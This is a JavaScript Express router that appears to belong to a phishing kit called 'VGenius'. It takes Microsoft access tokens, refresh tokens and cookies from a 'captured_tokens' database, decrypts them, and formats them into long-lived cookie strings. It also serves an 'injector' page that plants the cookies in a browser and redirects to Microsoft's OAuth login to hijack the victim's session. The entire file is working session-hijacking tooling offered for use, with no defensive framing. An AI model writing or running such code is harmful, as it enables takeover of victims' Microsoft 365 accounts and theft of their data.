const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');

// ─── Cookie Injector Page ───────────────────────────────────────────
router.get('/page/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const cookies = decrypt(token.cookies_encrypted);

    if (!accessToken && !refreshToken && !cookies) {
      return res.status(400).send('No tokens available');
    }

    var cookiesList = [];

    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({
          name: 'x-ms-RefreshTokenCredential',
          value: accessToken,
          domain: '.login.microsoftonline.com'
        });
      }
      if (refreshToken) {
        cookiesList.push({
          name: 'RefreshToken',
          value: refreshToken,
          domain: '.login.microsoftonline.com'
        });
      }
    }

    if (cookiesList.length === 0) {
      return res.status(400).send('No cookies available');
    }

    var clientId = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var tokenId = req.params.id;

    res.type('html').send(generateInjectorPage(cookiesList, clientId, tenant, tokenId));
  } catch (err) {
    console.error('[CookieInject] Page error:', err);
    res.status(500).send('Server error');
  }
});

// ─── Direct Cookie Injection API ────────────────────────────────────
router.get('/raw/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const cookies = decrypt(token.cookies_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);
    const refreshToken = decrypt(token.refresh_token_encrypted);

    if (!cookies && !accessToken && !refreshToken) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var cookiesList = [];
    if (cookies) {
      cookiesList = parseCookies(cookies);
    } else {
      if (accessToken) {
        cookiesList.push({
          name: 'x-ms-RefreshTokenCredential',
          value: accessToken,
          domain: '.login.microsoftonline.com'
        });
      }
      if (refreshToken) {
        cookiesList.push({
          name: 'RefreshToken',
          value: refreshToken,
          domain: '.login.microsoftonline.com'
        });
      }
    }

    var cookieString = '';
    var expires = new Date();
    expires.setFullYear(expires.getFullYear() + 100);
    var expStr = expires.toUTCString();

    for (var i = 0; i < cookiesList.length; i++) {
      var c = cookiesList[i];
      cookieString += c.name + '=' + encodeURIComponent(c.value);
      cookieString += '; domain=' + (c.domain || '.login.microsoftonline.com');
      cookieString += '; path=/; ';
      cookieString += 'expires=' + expStr + '; ';
      cookieString += 'SameSite=None; Secure; ';
    }

    res.json({
      success: true,
      cookie_string: cookieString.trim().slice(0, -2),
      cookie_count: cookiesList.length,
      cookies: cookiesList
    });
  } catch (err) {
    console.error('[CookieInject] Raw error:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Parse Cookie String ────────────────────────────────────────────
function parseCookies(cookieString) {
  if (!cookieString) return [];

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');

    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      // Skip cookie attributes
      if (nameLower === 'expires' ||
          nameLower === 'max-age' ||
          nameLower === 'domain' ||
          nameLower === 'path' ||
          nameLower === 'secure' ||
          nameLower === 'httponly' ||
          nameLower === 'samesite' ||
          nameLower.startsWith('samesite=')) {
        continue;
      }

      // Skip empty values
      if (!value || value.length === 0) continue;

      // Store unique cookies by lowercase name
      seenNames[nameLower] = {
        name: name,
        value: value,
        domain: '.login.microsoftonline.com'
      };
    }
  }

  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }

  return cookies;
}

// ─── Generate Injector HTML Page ────────────────────────────────────
function generateInjectorPage(cookies, clientId, tenant, tokenId) {
  var cookieJson = JSON.stringify(cookies);
  var expires = new Date();
  expires.setFullYear(expires.getFullYear() + 100);
  var expStr = expires.toUTCString();

  var html = '<!DOCTYPE html>\n';
  html += '<html lang="en">\n<head>\n';
  html += '  <meta charset="UTF-8">\n';
  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
  html += '  <title>VGenius Cookie Injector</title>\n';
  html += '  <style>\n';
  html += '    body {\n';
  html += '      font-family: Arial, sans-serif;\n';
  html += '      padding: 20px;\n';
  html += '      max-width: 800px;\n';
  html += '      margin: 0 auto;\n';
  html += '      background: #0a0a1a;\n';
  html += '      color: #e0e0e0;\n';
  html += '    }\n';
  html += '    button {\n';
  html += '      margin: 10px 5px;\n';
  html += '      padding: 12px 24px;\n';
  html += '      cursor: pointer;\n';
  html += '      background: #00ccff;\n';
  html += '      color: #000;\n';
  html += '      border: none;\n';
  html += '      border-radius: 6px;\n';
  html += '      font-weight: bold;\n';
  html += '      font-size: 14px;\n';
  html += '    }\n';
  html += '    button:hover { background: #00aacc; }\n';
  html += '    .status { margin-top: 15px; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 13px; }\n';
  html += '    .success { background: #0a2a0a; color: #0f0; border: 1px solid #0f0; }\n';
  html += '    .error { background: #2a0a0a; color: #f00; border: 1px solid #f00; }\n';
  html += '    .info { background: #0a0a2a; color: #00f; border: 1px solid #00f; }\n';
  html += '    pre { background: #000; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 11px; }\n';
  html += '  </style>\n';
  html += '</head>\n<body>\n';
  html += '  <h1 style="color:#00ccff">VGenius Session Cookie Injector</h1>\n';
  html += '  <p>This tool will set Microsoft session cookies and redirect you to login.</p>\n';
  html += '  <p><strong>Cookies available:</strong> ' + cookies.length + '</p>\n';
  html += '  <p><strong>Token ID:</strong> ' + tokenId + '</p>\n';
  html += '  <button onclick="startInjection()">INJECT COOKIES & OPEN MICROSOFT LOGIN</button>\n';
  html += '  <div id="status"></div>\n';
  html += '  <div id="details"></div>\n';
  html += '  <script>\n';
  html += '    var cookies = ' + cookieJson + ';\n';
  html += '    var expStr = "' + expStr + '";\n';
  html += '    var statusEl = document.getElementById("status");\n';
  html += '    var detailsEl = document.getElementById("details");\n';
  html += '    var tokenId = "' + tokenId + '";\n\n';

  // Show cookie details
  html += '    function showDetails() {\n';
  html += '      var h = "<h3>Cookie Details:</h3><pre>";\n';
  html += '      for (var i = 0; i < cookies.length; i++) {\n';
  html += '        h += cookies[i].name + "=" + cookies[i].value.substring(0, 20) + "...\\n";\n';
  html += '      }\n';
  html += '      h += "</pre>";\n';
  html += '      detailsEl.innerHTML = h;\n';
  html += '    }\n';
  html += '    showDetails();\n\n';

  // Start injection
  html += '    function startInjection() {\n';
  html += '      setStatus("Fetching cookies from server...", "info");\n\n';

  // Fetch raw cookies from API
  html += '      fetch("/api/tokens/inject/raw/" + tokenId)\n';
  html += '        .then(function(r) { return r.json(); })\n';
  html += '        .then(function(data) {\n';
  html += '          if (!data.success) throw new Error(data.error);\n';
  html += '          setStatus("Got ' + cookies.length + ' cookies. Setting them now...", "info");\n';
  html += '          setCookiesInBrowser(data.cookie_string);\n';
  html += '        })\n';
  html += '        .catch(function(err) {\n';
  html += '          setStatus("Error: " + err.message, "error");\n';
  html += '        });\n';
  html += '    }\n\n';

  // Set cookies in browser
  html += '    function setCookiesInBrowser(cookieString) {\n';
  html += '      var parts = cookieString.split("; ");\n';
  html += '      var count = 0;\n';
  html += '      for (var i = 0; i < parts.length; i++) {\n';
  html += '        try {\n';
  html += '          var part = parts[i].trim();\n';
  html += '          var eqIdx = part.indexOf("=");\n';
  html += '          if (eqIdx > 0) {\n';
  html += '            var cname = part.substring(0, eqIdx);\n';
  html += '            var cval = part.substring(eqIdx + 1).split(";")[0];\n';
  html += '            document.cookie = cname + "=" + cval + "; path=/; SameSite=None; Secure";\n';
  html += '            count++;\n';
  html += '          }\n';
  html += '        } catch (e) {}\n';
  html += '      }\n';
  html += '      setStatus("Set ' + count + ' cookies on current origin. Redirecting to Microsoft login...", "success");\n';
  html += '      detailsEl.innerHTML += "<p>Cookies set: " + count + "</p>";\n\n';

  // Redirect to Microsoft with the client_id from env
  html += '      setTimeout(function() {\n';
  html += '        var msUrl = "https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?";\n';
  html += '        msUrl += "client_id=' + clientId + '";\n';
  html += '        msUrl += "&redirect_uri=https://www.office.com/";\n';
  html += '        msUrl += "&response_type=code";\n';
  html += '        msUrl += "&scope=openid%20profile%20email";\n';
  html += '        window.location.href = msUrl;\n';
  html += '      }, 1500);\n';
  html += '    }\n\n';

  // Status helper
  html += '    function setStatus(msg, type) {\n';
  html += '      statusEl.className = "status " + type;\n';
  html += '      statusEl.innerHTML = msg;\n';
  html += '    }\n';
  html += '  </script>\n';
  html += '</body>\n</html>';

  return html;
}

module.exports = router;
